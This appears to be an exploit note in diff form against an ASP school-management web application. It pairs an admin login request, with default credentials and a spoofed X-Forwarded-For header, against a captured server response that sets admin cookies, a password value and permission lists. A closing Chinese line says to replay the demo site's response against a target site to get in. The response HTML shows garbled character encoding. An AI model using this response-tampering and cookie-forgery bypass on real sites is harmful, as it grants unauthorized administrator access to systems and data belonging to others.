@@ -1,81 +1,19 @@
-Set-Cookie: qx=656%2C+657%2C+658%2C+672%2C+659%2C+660%2C+661%2C+662%2C+663%2C+664; path=/
-Set-Cookie: dele=1; path=/
-Set-Cookie: qx2=665%2C+666%2C+667%2C+668%2C+669%2C+670%2C+671%2C+674%2C+673%2C+675%2C+676%2C+677%2C+678%2C+679%2C+680%2C+681%2C+682%2C+683%2C+684%2C+685%2C+686%2C+687%2C+688%2C+689%2C+690%2C+691%2C+692%2C+694%2C+695%2C+696%2C+697%2C+698%2C+699%2C+700%2C+701; path=/
-Set-Cookie: hongtou=1; path=/
-Set-Cookie: zhiban=1; path=/
-Set-Cookie: pass=1; path=/
-Set-Cookie: sky=1; path=/
-Set-Cookie: book=11%2C+10%2C+9%2C+8; path=/
-Set-Cookie: qianshou=1; path=/
-Set-Cookie: id=50; expires=Sun, 06-Jan-2019 05:37:30 GMT; path=/
-Set-Cookie: userpassword=7a57a5a743894a0e; path=/
-Set-Cookie: vip=649; path=/
-Set-Cookie: title=%B9%DC%C0%ED%D4%B1; path=/
-Set-Cookie: username=admin; expires=Sun, 06-Jan-2019 05:37:30 GMT; path=/
-Set-Cookie: ASPSESSIONIDCCBDBQAD=EMABNPLAIMNKCEIOLMNGDGDO; path=/
-X-Powered-By: ASP.NET
-X-Frame-Options: SAMEORIGIN
-Date: Sun, 06 Jan 2019 04:37:29 GMT
+POST /demo/edu/nz0808/login.asp HTTP/1.1
+Host: www.ningzhi.net
+User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
+Referer: http://www.ningzhi.net/demo/edu/nz0808/
+Cookie: popped=yes; security_session_verify=c7960a9a5993d33ae002a4935f9cfff9; ASPSESSIONIDQCBCDSAB=CDLLJEJAELHPAPAMFBGMPCDH; qianshou=1; sky=1; pass=1; zhiban=1; hongtou=1; qx2=665%2C+666%2C+667%2C+668%2C+669%2C+670%2C+671%2C+674%2C+673%2C+675%2C+676%2C+677%2C+678%2C+679%2C+680%2C+681%2C+682%2C+683%2C+684%2C+685%2C+686%2C+687%2C+688%2C+689%2C+690%2C+691%2C+692%2C+694%2C+695%2C+696%2C+697%2C+698%2C+699%2C+700%2C+701; dele=1; qx=656%2C+657%2C+658%2C+672%2C+659%2C+660%2C+661%2C+662%2C+663%2C+664; userpassword=7a57a5a743894a0e; title=%B9%DC%C0%ED%D4%B1; vip=649; __tins__2030571=%7B%22sid%22%3A%201546747470749%2C%20%22vd%22%3A%201%2C%20%22expires%22%3A%201546749270749%7D; __51cke__=; __51laig__=1
+DNT: 1
+X-Forwarded-For: 8.8.8.8
 Connection: close
+Upgrade-Insecure-Requests: 1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 56
+
+username=admin&userpassword=admin&Submit=+%B5%C7+%C2%BC+
 
 
-<!--ºóÌ¨µ÷ÓÃ -->
 
-
-
-
-
-<script language="JavaScript">
-function Display(ID)
-{
- if( ID.style.display == 'none' )
-{
-ID.style.display = '' ;
-}
-else	
-{
-ID.style.display = 'none' ;
-}
-}
-</script>
-
-<script>
-function selectAll(obj)
-{
-for(var i = 0;i<obj.elements.length;i++)
-if(obj.elements[i].type == "checkbox")
-obj.elements[i].checked = true;
-}
-function selectOther(obj)
-{
-for(var i = 0;i<obj.elements.length;i++)
-if(obj.elements[i].type == "checkbox" )
-{
-if(!obj.elements[i].checked)
-obj.elements[i].checked = true;
-else
-obj.elements[i].checked = false;
-
-}
-}
-</script>
-
-<script language="javascript">
-function changecolor(obj)
-{
-   e = event.srcElement
-   if(e.checked==true)
-   {
-     e = e.parentElement
-     e = e.parentElement
-     e.style.background = "#C1D2EE"
-    }
-    else
-    {
-      e = e.parentElement
-      e = e.parentElement
-      e.style.background = "#ffffff"
-     }
-} 
-
-</script><script language=javascript>alert('µÇÂ½³É¹¦£¡');this.location.href='manage.asp';</script>
+说明：利用官方演示站点，获取到的返回值，修改成目标网站的返回值即可利用成功。
